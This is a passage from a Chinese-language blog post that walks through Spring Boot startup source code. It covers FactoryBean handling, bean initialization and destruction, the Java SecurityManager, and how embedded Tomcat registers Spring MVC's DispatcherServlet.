就是通过工厂方法声明的 bean，例如我们在配置数据库连接的时候 通过 @Bean 加上方法实现。factoryBean 会带上一个 &#39;&amp;&#39; 符号标明。注意 factoryBean 和 beanFactory 完全是两回事，不要搞乱了。         // 2.9.10.1 factorybean         if (isFactoryBean(beanName)) {            // 2.9.10.2 bean 初始化 getBean            Object bean = getBean(FACTORY_BEAN_PREFIX + beanName);            if (bean instanceof FactoryBean) {               final FactoryBean&lt;?&gt; factory = (FactoryBean&lt;?&gt;) bean;               boolean isEagerInit;               // 2.9.10.3 java 安全管理器               if (System.getSecurityManager() != null &amp;&amp; factory instanceof SmartFactoryBean) {                  isEagerInit = AccessController.doPrivileged((PrivilegedAction&lt;Boolean&gt;)                              ((SmartFactoryBean&lt;?&gt;) factory)::isEagerInit,                        getAccessControlContext());               }               else {                  isEagerInit = (factory instanceof SmartFactoryBean &amp;&amp;                        ((SmartFactoryBean&lt;?&gt;) factory).isEagerInit());               }               if (isEagerInit) {                  getBean(beanName);               }            }         }         else {            getBean(beanName);         }      }   }   // 2.9.10.4 smartSingleton   for (String beanName : beanNames) {      Object singletonInstance = getSingleton(beanName);      if (singletonInstance instanceof SmartInitializingSingleton) {         final SmartInitializingSingleton smartSingleton = (SmartInitializingSingleton) singletonInstance;         if (System.getSecurityManager() != null) {            AccessController.doPrivileged((PrivilegedAction&lt;Object&gt;) () -&gt; {               smartSingleton.afterSingletonsInstantiated();               return null;            }, getAccessControlContext());         }         else {            smartSingleton.afterSingletonsInstantiated();         }      }   }}</code></pre><h6 id="2-9-10-1-factorybean-补充点"><a href="#2-9-10-1-factorybean-补充点" class="headerlink" title="2.9.10.1 factorybean [补充点]"></a>2.9.10.1 factorybean [补充点]</h6><p>工厂就是为复杂的对象构造准备的，简单的构造通过构造函数完成，复杂的构造通过工厂完成，工厂提供一个构造方法。</p><p>在  Spring 中也可以提供一个构造方法，然后 spring 构造 bean 时调用方法而不是构造函数。</p><pre><code class="java">public interface FactoryBean&lt;T&gt; {    T getObject() throws Exception;    Class&lt;T&gt; getObjectType();    boolean isSingleton();}@Componentpublic class PersonFactoryBean implements FactoryBean&lt;Person&gt;{    private String agender;     private int age ;    public Person getObject(){       // 执行 bean 的构造,例如 new Person 等复    }    public Class&lt;Person&gt; getObjectType() { return Person.class ; }     public boolean isSingleton() { return false; }}</code></pre><p>这样可以提供更好地灵活性，可以获取 isSingleton、getObjectType 等额外信息。</p><pre><code class="java">@Configuration public class DBConfiguration {     @Bean    public DataSource dataBea(){       // 构造 DataSource    } }</code></pre><p>实际上这种也是 factoryBean。isFactoryBean 的逻辑比较复杂，在后面 spring 中可以单独处理。</p><h6 id="2-9-10-2-bean-初始化-getBean-补充点"><a href="#2-9-10-2-bean-初始化-getBean-补充点" class="headerlink" title="2.9.10.2 bean 初始化 getBean [补充点]"></a>2.9.10.2 bean 初始化 getBean [补充点]</h6><p>getBean 是 Spring 中最重要的一个方法，承担了初始化 bean 的职责。 getBean 最终调用的是 doGetBean，这个方法非常长，包含了 Spring 核心逻辑，需要一定 IOC 理论知识，这里不展开。</p><p>说下初始化的 bean 的过程主要有：</p><ol><li>根据别名获取 beanName transformedBeanName</li><li>尝试获取实例 getSingleton</li><li>如果存在<ol><li>返回存在的 bean</li></ol></li><li>如果不存在<ol><li>检查 BeanDefinition</li><li>获取依赖项</li><li>注册依赖项</li><li>递归调用 getBean 创建被依赖项</li><li>创建 bean createBean<ol><li>创建 bean 实例 createBeanInstance<ol><li>使用依赖注入构造</li><li>使用无参构造</li><li>最终使用 BeanUtils 或者 instantiateWithMethodInjection 初始化</li></ol></li><li>应用 PostProcessor，回调方法</li><li>为 bean 赋值 populateBean 给一些简单参数赋值</li><li>初始化创建的 bean initializeBean ，各种回调</li><li>处理循环依赖</li></ol></li><li>获取创建完成的 bean</li><li>如果不是单例，需要根据对应的 scope 处理</li><li>检查类型</li></ol></li></ol><p>这部分可以参考 <a href="https://www.javadoop.com/post/spring-ioc#toc_7" target="_blank" rel="noopener">https://www.javadoop.com/post/spring-ioc#toc_7</a></p><h6 id="2-9-10-3-java-安全管理器"><a href="#2-9-10-3-java-安全管理器" class="headerlink" title="2.9.10.3 java 安全管理器"></a>2.9.10.3 java 安全管理器</h6><pre><code class="java">           if (System.getSecurityManager() != null &amp;&amp; factory instanceof SmartFactoryBean) {              isEagerInit = AccessController.doPrivileged((PrivilegedAction&lt;Boolean&gt;)                          ((SmartFactoryBean&lt;?&gt;) factory)::isEagerInit,                    getAccessControlContext());           }</code></pre><p>安全管理器在Java语言中的作用就是检查操作是否有权限执行。<code>-Djava.security.manager</code> 开启后，可以配置一个 policy 给予应用一些权限。例如 jstatd 远程内存调试就需要配置 <em>java</em>.policy 然后开启网络访问。</p><p>SecurityManager 提供如下访问权限检查，包括文件的读写删除和执行、网络的连接和监听、线程的访问、以及其他包括打印机剪贴板等系统功能。</p><pre><code>checkAccept(String, int)checkAccess(Thread)checkAccess(ThreadGroup)checkAwtEventQueueAccess()checkConnect(String, int)checkConnect(String, int, Object)checkCreateClassLoader()checkDelete(String)checkExec(String)checkExit(int)checkLink(String)checkListen(int)checkMemberAccess(Class&lt;?&gt;, int)checkMulticast(InetAddress)checkMulticast(InetAddress, byte)checkPackageAccess(String)checkPackageDefinition(String)checkPermission(Permission)checkPermission(Permission, Object)checkPrintJobAccess()checkPropertiesAccess()checkPropertyAccess(String)checkRead(FileDescriptor)checkRead(String)checkRead(String, Object)checkSecurityAccess(String)checkSetFactory()checkSystemClipboardAccess()checkTopLevelWindow(Object)checkWrite(FileDescriptor)checkWrite(String)</code></pre><p>SecurityManager 中的几个关键概念</p><p><strong>AccessController</strong></p><p>其实就是暴露给应用的一个 API  checkPermission，提供权限检查使用。</p><p><strong>CodeSource</strong></p><p>用来声明从哪里加载类，其实就是包装了 URL。</p><p><strong>Permission</strong></p><p>权限的抽象，用来表示那些资源可以被访问。</p><p><strong>策略Policy</strong></p><p>一组权限规则，在JVM中，任何情况下只能安装一个策略类的实例。可以通过  Policy.setPolicy() 动态设置，也可以使用 policy.provider=sun.security.provider.PolicyFile 指定。</p><p><strong>ProtectionDomain</strong></p><p>保护域是一个代码源的一组权限，每一个类都属于一个保护域，这个是 ClassLoader 决定了的。</p><p><strong>ClassLoader</strong></p><p>权限与类对象之间的映射，提供权限来源，类加载器根据双亲委派模型。最基础的是系统类加载器，有很多子类比如 URLClassLoader。</p><p>加载一个类时，以委托的形式逐层询问，父亲优先。一旦为一个域的类定义类加载器，其他类加载器不能再定义，防止冲突。另外也是类加载器来进行检查安全。</p><h5 id="3-9-11-销毁已经初始化的-singleton-的-Beans"><a href="#3-9-11-销毁已经初始化的-singleton-的-Beans" class="headerlink" title="3.9.11 销毁已经初始化的 singleton 的 Beans"></a>3.9.11 销毁已经初始化的 singleton 的 Beans</h5><p>如果构造过程中出错，需要把已经成功构建的 bean是销毁。</p><pre><code class="java">protected void destroyBeans() {   getBeanFactory().destroySingletons();}</code></pre><pre><code class="java">// 位于 DefaultListableBeanFactory.java @Overridepublic void destroySingletons() {   super.destroySingletons();   updateManualSingletonNames(Set::clear, set -&gt; !set.isEmpty());   clearByTypeCache();}</code></pre><pre><code class="java">@Overridepublic void destroySingletons() {   super.destroySingletons();   updateManualSingletonNames(Set::clear, set -&gt; !set.isEmpty());   clearByTypeCache();}// 父类的销毁方法public void destroySingletons() {        if (logger.isTraceEnabled()) {            logger.trace(&quot;Destroying singletons in &quot; + this);        }        synchronized (this.singletonObjects) {            this.singletonsCurrentlyInDestruction = true;        }        String[] disposableBeanNames;        synchronized (this.disposableBeans) {            disposableBeanNames = StringUtils.toStringArray(this.disposableBeans.keySet());        }        for (int i = disposableBeanNames.length - 1; i &gt;= 0; i--) {            destroySingleton(disposableBeanNames[i]);        }        this.containedBeanMap.clear();        this.dependentBeanMap.clear();        this.dependenciesForBeanMap.clear();        clearSingletonCache();    }</code></pre><p>销毁掉列表中所有的记录，然后递归销毁</p><pre><code class="java">// 位于 DefaultSingletonBeanRegistry    public void destroySingleton(String beanName) {        // Remove a registered singleton of the given name, if any.        removeSingleton(beanName);        // Destroy the corresponding DisposableBean instance.        DisposableBean disposableBean;        synchronized (this.disposableBeans) {            disposableBean = (DisposableBean) this.disposableBeans.remove(beanName);        }        destroyBean(beanName, disposableBean);    }  protected void destroyBean(String beanName, @Nullable DisposableBean bean) {        // Trigger destruction of dependent beans first...        Set&lt;String&gt; dependencies;        synchronized (this.dependentBeanMap) {            // Within full synchronization in order to guarantee a disconnected Set            dependencies = this.dependentBeanMap.remove(beanName);        }        if (dependencies != null) {            if (logger.isTraceEnabled()) {                logger.trace(&quot;Retrieved dependent beans for bean &#39;&quot; + beanName + &quot;&#39;: &quot; + dependencies);            }            for (String dependentBeanName : dependencies) {                destroySingleton(dependentBeanName);            }        }        // Actually destroy the bean now...        if (bean != null) {            try {                bean.destroy();            }            catch (Throwable ex) {                if (logger.isWarnEnabled()) {                    logger.warn(&quot;Destruction of bean with name &#39;&quot; + beanName + &quot;&#39; threw an exception&quot;, ex);                }            }        }        // Trigger destruction of contained beans...        Set&lt;String&gt; containedBeans;        synchronized (this.containedBeanMap) {            // Within full synchronization in order to guarantee a disconnected Set            containedBeans = this.containedBeanMap.remove(beanName);        }        if (containedBeans != null) {            for (String containedBeanName : containedBeans) {                destroySingleton(containedBeanName);            }        }        // Remove destroyed bean from other beans&#39; dependencies.        synchronized (this.dependentBeanMap) {            for (Iterator&lt;Map.Entry&lt;String, Set&lt;String&gt;&gt;&gt; it = this.dependentBeanMap.entrySet().iterator(); it.hasNext();) {                Map.Entry&lt;String, Set&lt;String&gt;&gt; entry = it.next();                Set&lt;String&gt; dependenciesToClean = entry.getValue();                dependenciesToClean.remove(beanName);                if (dependenciesToClean.isEmpty()) {                    it.remove();                }            }        }        // Remove destroyed bean&#39;s prepared dependency information.        this.dependenciesForBeanMap.remove(beanName);    }</code></pre><p>因为存在循环引用，Spring 不得不手动的清理掉所有的依赖关系，否则 GC 无法释放资源。</p><h5 id="3-9-12-清理构建过程中的对象缓存"><a href="#3-9-12-清理构建过程中的对象缓存" class="headerlink" title="3.9.12 清理构建过程中的对象缓存"></a>3.9.12 清理构建过程中的对象缓存</h5><pre><code class="java">protected void resetCommonCaches() {   // 反射缓存   ReflectionUtils.clearCache();   // 注解缓存   AnnotationUtils.clearCache();   // IOC 缓存   ResolvableType.clearCache();  // 清理类加载器   CachedIntrospectionResults.clearClassLoader(getClassLoader());}</code></pre><h3 id="3-10-应用上下文刷新后置处理"><a href="#3-10-应用上下文刷新后置处理" class="headerlink" title="3.10 应用上下文刷新后置处理"></a>3.10 应用上下文刷新后置处理</h3><p>回调钩子函数，没有内容</p><h3 id="3-11-停止计时监控类"><a href="#3-11-停止计时监控类" class="headerlink" title="3.11 停止计时监控类"></a>3.11 停止计时监控类</h3><pre><code class="java">if (this.currentTaskName == null) {   throw new IllegalStateException(&quot;Can&#39;t stop StopWatch: it&#39;s not running&quot;);}long lastTime = System.nanoTime() - this.startTimeNanos;this.totalTimeNanos += lastTime;this.lastTaskInfo = new TaskInfo(this.currentTaskName, lastTime);if (this.keepTaskList) {   this.taskList.add(this.lastTaskInfo);}++this.taskCount;this.currentTaskName = null;</code></pre><p>停止计时，计算启动花费的时间。</p><h3 id="3-12-输出日志记录执行主类名、时间信息"><a href="#3-12-输出日志记录执行主类名、时间信息" class="headerlink" title="3.12 输出日志记录执行主类名、时间信息"></a>3.12 输出日志记录执行主类名、时间信息</h3><pre><code class="java">if (this.logStartupInfo) {   new StartupInfoLogger(this.mainApplicationClass).logStarted(getApplicationLog(), stopWatch);}</code></pre><h3 id="3-13-发布应用上下文启动完成事件"><a href="#3-13-发布应用上下文启动完成事件" class="headerlink" title="3.13 发布应用上下文启动完成事件"></a>3.13 发布应用上下文启动完成事件</h3><pre><code class="java">void started(ConfigurableApplicationContext context) {   for (SpringApplicationRunListener listener : this.listeners) {      listener.started(context);   }}</code></pre><p>给所有的监听器，发布启动完成的事件。</p><h3 id="3-14-执行所有-Runner-运行器"><a href="#3-14-执行所有-Runner-运行器" class="headerlink" title="3.14 执行所有 Runner 运行器"></a>3.14 执行所有 Runner 运行器</h3><p>SpringBoot 的 ApplicationRunner 接口可以让项目在启动时候初始化一些信息 ，比如数据库连接等。</p><pre><code class="java">private void callRunners(ApplicationContext context, ApplicationArguments args) {   List&lt;Object&gt; runners = new ArrayList&lt;&gt;();   runners.addAll(context.getBeansOfType(ApplicationRunner.class).values());   runners.addAll(context.getBeansOfType(CommandLineRunner.class).values());   AnnotationAwareOrderComparator.sort(runners);   for (Object runner : new LinkedHashSet&lt;&gt;(runners)) {      if (runner instanceof ApplicationRunner) {         callRunner((ApplicationRunner) runner, args);      }      if (runner instanceof CommandLineRunner) {         callRunner((CommandLineRunner) runner, args);      }   }}</code></pre><p>Spring boot 官方例子中，定义了一个 CommandRunder，可以打出定义的所有的 bean，这个方法会在这个时机被运行。</p><pre><code class="java">@Beanpublic CommandLineRunner commandLineRunner(ApplicationContext ctx) {    return args -&gt; {        System.out.println(&quot;Let&#39;s inspect the beans provided by Spring Boot:&quot;);        String[] beanNames = ctx.getBeanDefinitionNames();        Arrays.sort(beanNames);        for (String beanName : beanNames) {            System.out.println(beanName);        }    };}</code></pre><h3 id="3-15-发布应用上下文就绪事件"><a href="#3-15-发布应用上下文就绪事件" class="headerlink" title="3.15 发布应用上下文就绪事件"></a>3.15 发布应用上下文就绪事件</h3><pre><code>void running(ConfigurableApplicationContext context) {   for (SpringApplicationRunListener listener : this.listeners) {      listener.running(context);   }}</code></pre><h3 id="3-16-处理运行异常"><a href="#3-16-处理运行异常" class="headerlink" title="3.16 处理运行异常"></a>3.16 处理运行异常</h3><pre><code class="java">private void handleRunFailure(ConfigurableApplicationContext context, Throwable exception,      Collection&lt;SpringBootExceptionReporter&gt; exceptionReporters, SpringApplicationRunListeners listeners) {   try {      try {         handleExitCode(context, exception);         if (listeners != null) {            listeners.failed(context, exception);         }      }      finally {         reportFailure(exceptionReporters, exception);         if (context != null) {            context.close();         }      }   }   catch (Exception ex) {      logger.warn(&quot;Unable to close ApplicationContext&quot;, ex);   }   ReflectionUtils.rethrowRuntimeException(exception);}</code></pre><p>启动过程中出现异常，会丢出异常。然后关闭上下文，context.close() 会做一些清理工作，和 bean 创建失败的操作差不太多。</p><h2 id="4-补充点"><a href="#4-补充点" class="headerlink" title="4 补充点"></a>4 补充点</h2><h3 id="1-自动配置的那些类是什么时候被加载的呢，包扫描的细节是什么？"><a href="#1-自动配置的那些类是什么时候被加载的呢，包扫描的细节是什么？" class="headerlink" title="1 自动配置的那些类是什么时候被加载的呢，包扫描的细节是什么？"></a>1 自动配置的那些类是什么时候被加载的呢，包扫描的细节是什么？</h3><h3 id="2-Tomcat-是怎么知道-Spring-mvc-的-Servlet-入口点的呢？"><a href="#2-Tomcat-是怎么知道-Spring-mvc-的-Servlet-入口点的呢？" class="headerlink" title="2 Tomcat 是怎么知道 Spring mvc 的 Servlet 入口点的呢？"></a>2 Tomcat 是怎么知道 Spring mvc 的 Servlet 入口点的呢？</h3><p>这个过程是异步的，也就是在另外一个线程被处理了，因此源码分析比较困难。关键点在 onRefresh 方法，这个方法中启动了一个  web server，同时注册了 Servlet。</p><p>我们 在 SpringApplication 中有一句 refreshContext，然后交给 Spring 的上下文去初始化应用，然后调用了 onRefresh。</p><p>我们回忆一下这个过程：</p><ol><li>SpringApplication.run</li><li>SpringApplication.refresh</li><li>ServletWebServerApplicationContext.onRefresh</li><li>ServletWebServerApplicationContext.createWebServer</li></ol><p>现在我们从 ServletWebServerApplicationContext.createWebServer 开始分析。</p><pre><code class="java">private void createWebServer() {   WebServer webServer = this.webServer;   ServletContext servletContext = getServletContext();   if (webServer == null &amp;&amp; servletContext == null) {      // 根据加载进来的类，决定使用哪种 web 服务器，默认是 TomcatReactiveWebServerFactory      // 4.2.1 获取 ServletWebServerFactory      ServletWebServerFactory factory = getWebServerFactory();      //  TomcatReactiveWebServerFactory 帮忙获取 web 服务器实例，以及在启动时候注册 servlet      // 4.2.2 获取获取初始化器      // 4.2.3 获取 web server      this.webServer = factory.getWebServer(getSelfInitializer());   }   else if (servletContext != null) {      try {         // 这一句代码非常误导，实际上 servletContext 都会为空，除非热加载，因此初始化的关键在 factory.getWebServer(getSelfInitializer());         getSelfInitializer().onStartup(servletContext);      }      catch (ServletException ex) {         throw new ApplicationContextException(&quot;Cannot initialize servlet context&quot;, ex);      }   }   initPropertySources();}</code></pre><h4 id="4-2-1-获取-ServletWebServerFactory"><a href="#4-2-1-获取-ServletWebServerFactory" class="headerlink" title="4.2.1 获取 ServletWebServerFactory"></a>4.2.1 获取 ServletWebServerFactory</h4><pre><code class="java">protected ServletWebServerFactory getWebServerFactory() {   // Use bean names so that we don&#39;t consider the hierarchy   String[] beanNames = getBeanFactory().getBeanNamesForType(ServletWebServerFactory.class);   if (beanNames.length == 0) {      throw new ApplicationContextException(&quot;Unable to start ServletWebServerApplicationContext due to missing &quot;            + &quot;ServletWebServerFactory bean.&quot;);   }   if (beanNames.length &gt; 1) {      throw new ApplicationContextException(&quot;Unable to start ServletWebServerApplicationContext due to multiple &quot;            + &quot;ServletWebServerFactory beans : &quot; + StringUtils.arrayToCommaDelimitedString(beanNames));   }   return getBeanFactory().getBean(beanNames[0], ServletWebServerFactory.class);}</code></pre><p>ServletWebServerFactory 用于初始化各种服务器，bean 工厂从根据类型找到它的实现类。这里默认得到的是 TomcatServletWebServerFactory。 </p><pre><code class="java">String[] beanNames = getBeanFactory().getBeanNamesForType(ServletWebServerFactory.class);</code></pre><p>它的实现类有好几个</p><p><img src="/Spring/spring/spring-boot-workflow/image-20200406214422826.png" alt="image-20200406214422826"></p><p>为什么这里就能得到 TomcatServletWebServerFactory  而不是其他的呢？</p><p>奥秘就是自动化配置 ServletWebServerFactoryConfiguration 这类中，根据 ConditionalOnClass  进行定义了一个 Bean。</p><pre><code class="java">@Configuration(proxyBeanMethods = false)@ConditionalOnClass({ Servlet.class, Tomcat.class, UpgradeProtocol.class })@ConditionalOnMissingBean(value = ServletWebServerFactory.class, search = SearchStrategy.CURRENT)static class EmbeddedTomcat {   @Bean   TomcatServletWebServerFactory tomcatServletWebServerFactory(         ObjectProvider&lt;TomcatConnectorCustomizer&gt; connectorCustomizers,         ObjectProvider&lt;TomcatContextCustomizer&gt; contextCustomizers,         ObjectProvider&lt;TomcatProtocolHandlerCustomizer&lt;?&gt;&gt; protocolHandlerCustomizers) {      TomcatServletWebServerFactory factory = new TomcatServletWebServerFactory();      factory.getTomcatConnectorCustomizers()            .addAll(connectorCustomizers.orderedStream().collect(Collectors.toList()));      factory.getTomcatContextCustomizers()            .addAll(contextCustomizers.orderedStream().collect(Collectors.toList()));      factory.getTomcatProtocolHandlerCustomizers()            .addAll(protocolHandlerCustomizers.orderedStream().collect(Collectors.toList()));      return factory;   }}</code></pre><h4 id="4-2-2-获取获取初始化器"><a href="#4-2-2-获取获取初始化器" class="headerlink" title="4.2.2 获取获取初始化器"></a>4.2.2 获取获取初始化器</h4><pre><code class="java">private org.springframework.boot.web.servlet.ServletContextInitializer getSelfInitializer() {   return this::selfInitialize;}private void selfInitialize(ServletContext servletContext) throws ServletException {   prepareWebApplicationContext(servletContext);   registerApplicationScope(servletContext);   WebApplicationContextUtils.registerEnvironmentBeans(getBeanFactory(), servletContext);   for (ServletContextInitializer beans : getServletContextInitializerBeans()) {      beans.onStartup(servletContext);   }}</code></pre><h4 id="4-2-3-获取-web-server"><a href="#4-2-3-获取-web-server" class="headerlink" title="4.2.3 获取 web server"></a>4.2.3 获取 web server</h4><pre><code class="java">@Overridepublic WebServer getWebServer(ServletContextInitializer... initializers) {   if (this.disableMBeanRegistry) {      Registry.disableRegistry();   }   // Tomcat 的主类   Tomcat tomcat = new Tomcat();   File baseDir = (this.baseDirectory != null) ? this.baseDirectory : createTempDir(&quot;tomcat&quot;);   tomcat.setBaseDir(baseDir.getAbsolutePath());   // Connector 和协议有关，HTTP、HTTPS等   Connector connector = new Connector(this.protocol);   connector.setThrowOnFailure(true);   tomcat.getService().addConnector(connector);   customizeConnector(connector);   tomcat.setConnector(connector);   tomcat.getHost().setAutoDeploy(false);   configureEngine(tomcat.getEngine());   for (Connector additionalConnector : this.additionalTomcatConnectors) {      tomcat.getService().addConnector(additionalConnector);   }   // 很多自定义的逻辑都是在这个方法中，做了一些初始化，根据配置设置服务器（又利用到了自动配置中的东西）   // 4.2.4 自定义配置服务器    prepareContext(tomcat.getHost(), initializers);   // 4.2.5 创建和启动抽象的服务，并触发 initializers   return getTomcatWebServer(tomcat);}</code></pre><h4 id="4-2-4-自定义配置服务器"><a href="#4-2-4-自定义配置服务器" class="headerlink" title="4.2.4 自定义配置服务器"></a>4.2.4 自定义配置服务器</h4><pre><code class="java">protected void prepareContext(Host host, ServletContextInitializer[] initializers) {   File documentRoot = getValidDocumentRoot();   // 创建服务器的上下文   TomcatEmbeddedContext context = new TomcatEmbeddedContext();   if (documentRoot != null) {      context.setResources(new LoaderHidingResourceRoot(context));   }   context.setName(getContextPath());   context.setDisplayName(getDisplayName());   context.setPath(getContextPath());   File docBase = (documentRoot != null) ? documentRoot : createTempDir(&quot;tomcat-docbase&quot;);   context.setDocBase(docBase.getAbsolutePath());   context.addLifecycleListener(new FixContextListener());   context.setParentClassLoader((this.resourceLoader != null) ? this.resourceLoader.getClassLoader()         : ClassUtils.getDefaultClassLoader());   resetDefaultLocaleMapping(context);   addLocaleMappings(context);   context.setUseRelativeRedirects(false);   try {      context.setCreateUploadTargets(true);   }   catch (NoSuchMethodError ex) {      // Tomcat is &lt; 8.5.39. Continue.   }   configureTldSkipPatterns(context);   WebappLoader loader = new WebappLoader(context.getParentClassLoader());   loader.setLoaderClass(TomcatEmbeddedWebappClassLoader.class.getName());   loader.setDelegate(true);   context.setLoader(loader);   // 添加了一个默认 Servlet 实际上后面会被覆盖掉，配置到根目录的。   if (isRegisterDefaultServlet()) {      addDefaultServlet(context);   }   if (shouldRegisterJspServlet()) {      addJspServlet(context);      addJasperInitializer(context);   }   context.addLifecycleListener(new StaticResourceConfigurer(context));   ServletContextInitializer[] initializersToUse = mergeInitializers(initializers);   host.addChild(context);   // 这里非常关键，根据项目配置文件配置   configureContext(context, initializersToUse);   // 钩子函数，这里面没什么东西   postProcessContext(context);}</code></pre><pre><code class="java">protected void configureContext(Context context, ServletContextInitializer[] initializers) {   // 创建了一个 starter    TomcatStarter starter = new TomcatStarter(initializers);   if (context instanceof TomcatEmbeddedContext) {      TomcatEmbeddedContext embeddedContext = (TomcatEmbeddedContext) context;      embeddedContext.setStarter(starter);      embeddedContext.setFailCtxIfServletStartFails(true);   }   context.addServletContainerInitializer(starter, NO_CLASSES);   for (LifecycleListener lifecycleListener : this.contextLifecycleListeners) {      context.addLifecycleListener(lifecycleListener);   }   for (Valve valve : this.contextValves) {      context.getPipeline().addValve(valve);   }   // 配置一些默认的错误页面   for (ErrorPage errorPage : getErrorPages()) {      org.apache.tomcat.util.descriptor.web.ErrorPage tomcatErrorPage = new org.apache.tomcat.util.descriptor.web.ErrorPage();      tomcatErrorPage.setLocation(errorPage.getPath());      tomcatErrorPage.setErrorCode(errorPage.getStatusCode());      tomcatErrorPage.setExceptionType(errorPage.getExceptionName());      context.addErrorPage(tomcatErrorPage);   }   // 配置一些 MIME mapping 也就是文件头   for (MimeMappings.Mapping mapping : getMimeMappings()) {      context.addMimeMapping(mapping.getExtension(), mapping.getMimeType());   }   // 配置 session，主要是配置一个 Manager，如果引入了 spring-session 会提供额外的 Manager 例如存储到 redis   configureSession(context);   new DisableReferenceClearingContextCustomizer().customize(context);   // 这个比较重要，用于配置，TomcatContextCustomizer 就是在自动配置包中的一个类，在 EmbeddedWebServerFactoryCustomizerAutoConfiguration 中被定义，根据配置文件配置服务器。   for (TomcatContextCustomizer customizer : this.tomcatContextCustomizers) {      customizer.customize(context);   }}</code></pre><pre><code class="java">@Configuration(proxyBeanMethods = false)@ConditionalOnWebApplication@EnableConfigurationProperties(ServerProperties.class)public class EmbeddedWebServerFactoryCustomizerAutoConfiguration {   /**    * Nested configuration if Tomcat is being used.    */   @Configuration(proxyBeanMethods = false)   @ConditionalOnClass({ Tomcat.class, UpgradeProtocol.class })   public static class TomcatWebServerFactoryCustomizerConfiguration {      @Bean      public TomcatWebServerFactoryCustomizer tomcatWebServerFactoryCustomizer(Environment environment,            ServerProperties serverProperties) {         return new TomcatWebServerFactoryCustomizer(environment, serverProperties);      }   }</code></pre><h4 id="4-2-5-创建和启动抽象的服务，并触发-initializers"><a href="#4-2-5-创建和启动抽象的服务，并触发-initializers" class="headerlink" title="4.2.5 创建和启动抽象的服务，并触发 initializers"></a>4.2.5 创建和启动抽象的服务，并触发 initializers</h4><pre><code class="java">protected TomcatWebServer getTomcatWebServer(Tomcat tomcat) {   return new TomcatWebServer(tomcat, getPort() &gt;= 0);}</code></pre><p>在构造函数中初始话</p><pre><code class="java">// 这个类还在 Spring boot 中public TomcatWebServer(Tomcat tomcat, boolean autoStart) {   Assert.notNull(tomcat, &quot;Tomcat Server must not be null&quot;);   this.tomcat = tomcat;   this.autoStart = autoStart;   initialize();}</code></pre><pre><code class="java">// 位于 TomecatWebServer,启停服都在这里private void initialize() throws WebServerException {   logger.info(&quot;Tomcat initialized with port(s): &quot; + getPortsDescription(false));   synchronized (this.monitor) {      try {         // 设置容器id，这个是为多容器设计的，实际上用不到         addInstanceIdToEngineName();           // 找到对应上下文         Context context = findContext();         context.addLifecycleListener((event) -&gt; {            if (context.equals(event.getSource()) &amp;&amp; Lifecycle.START_EVENT.equals(event.getType())) {               // Remove service connectors so that protocol binding doesn&#39;t               // happen when the service is started.               removeServiceConnectors();            }         });         // Start the server to trigger initialization          // 启动服务，终于交出控制权到 Tomcat 了         this.tomcat.start();         ...   }}</code></pre><pre><code class="java">public void start() throws LifecycleException {    getServer();    // StandardServer ,TomCat中的概念    server.start();}</code></pre><p>这里的启动源码看起来比较头疼，需要对 Tomcat 内部机制有一些了解主要逻辑：</p><ol><li>Spring boot 的 TomcatWebServer.start</li><li>Tomcat.start</li><li>StandardServer.start</li><li>NamingResources.start JEE 中的概念，命名上下文和 JNDI 上下文</li><li>StandardService.start 有多个 Service </li><li>StandardEngine.start </li><li>Container.start</li><li>StandardHost.start</li><li>StandardContext.start</li><li>StandardRoo.start </li><li>DirResourceSet.start</li><li>WebappLoader.start </li></ol><p>这里面具体的流程可以参考 Tomcat的源码分析, tomcat组成：SERVER（服务器）、service（服务）、connector（连接器）、engine（引擎）、host（主机）、context（应用服务）。</p><p>最终 StandardContext.start 启动完成后，会触发初始化器,实际上 spring mvc 工作在 context这层。</p><pre><code class="java">// Call ServletContainerInitializersfor (Map.Entry&lt;ServletContainerInitializer, Set&lt;Class&lt;?&gt;&gt;&gt; entry :    initializers.entrySet()) {    try {       // onStartup 非常重要        entry.getKey().onStartup(entry.getValue(),                getServletContext());    } catch (ServletException e) {        log.error(sm.getString(&quot;standardContext.sciFail&quot;), e);        ok = false;        break;    }}</code></pre><pre><code class="java">public void onStartup(Set&lt;Class&lt;?&gt;&gt; classes, ServletContext servletContext) throws ServletException {   try {      for (ServletContextInitializer initializer : this.initializers) {         initializer.onStartup(servletContext);      }   }</code></pre><p>这个数组中有三个初始化器，其中两个是 TomCat 自己的，主要看 AnnotationConfigServletWebServerApplicationContext 这个。</p><p>回调 AnnotationConfigServletWebServerApplicationContext.onStartup() 进入 selfInitialize方法。这里 spring boot 又自己循环了一次。</p><pre><code class="java">private void selfInitialize(ServletContext servletContext) throws ServletException {   prepareWebApplicationContext(servletContext);   registerApplicationScope(servletContext);   WebApplicationContextUtils.registerEnvironmentBeans(getBeanFactory(), servletContext);   // getServletContextInitializerBeans() 获取核心 Servlet 以及一些 filter   for (ServletContextInitializer beans : getServletContextInitializerBeans()) {      beans.onStartup(servletContext);   }}</code></pre><pre><code>DispatcherServletRegistrationBeanFilterRegistrationBeanFilterRegistrationBeanFilterRegistrationBean</code></pre><p>回到  Spring boot 的地盘，DispatcherServlet 这个类非常重要，就是 Spring MVC 的入口，通过它初始化 MVC 相关的映射。</p><p>主要看 DispatcherServletRegistrationBean 类，也是自动配置完成的。</p><pre><code class="java">protected final void register(String description, ServletContext servletContext) {   // 注册 Servlet 到 servletContext，servletContext 是 Tomcat 提供的。   D registration = addRegistration(description, servletContext);   if (registration == null) {      logger.info(StringUtils.capitalize(description) + &quot; was not registered (possibly already registered?)&quot;);      return;   }   configure(registration);}</code></pre><pre><code class="java">@Overrideprotected ServletRegistration.Dynamic addRegistration(String description, ServletContext servletContext) {   String name = getServletName();   return servletContext.addServlet(name, this.servlet);}</code></pre><pre><code class="java">@Overridepublic ServletRegistration.Dynamic addServlet(String servletName,        Servlet servlet) {    if (SecurityUtil.isPackageProtectionEnabled()) {        return (ServletRegistration.Dynamic) doPrivileged(&quot;addServlet&quot;,                new Class[]{String.class, Servlet.class},                new Object[]{servletName, servlet});    } else {        return context.addServlet(servletName, servlet);    }}</code></pre><p>context 是 TomCat 提供的，然后添加 dispatcherServlet。其他几个初始化器都是给 filter 使用的，不再展开了。</p><h3 id="3-大量的-Filter-是怎么注册给-Tomcat-的呢？"><a href="#3-大量的-Filter-是怎么注册给-Tomcat-的呢？" class="headerlink" title="3 大量的 Filter 是怎么注册给 Tomcat 的呢？"></a>3 大量的 Filter 是怎么注册给 Tomcat 的呢？</h3><h3 id="4-API-请求的-Mapping-关系什么时候映射的呢？"><a href="#4-API-请求的-Mapping-关系什么时候映射的呢？" class="headerlink" title="4 API 请求的 Mapping 关系什么时候映射的呢？"></a>4 API 请求的 Mapping 关系什么时候映射的呢？</h3><pre><code class="java">/** * 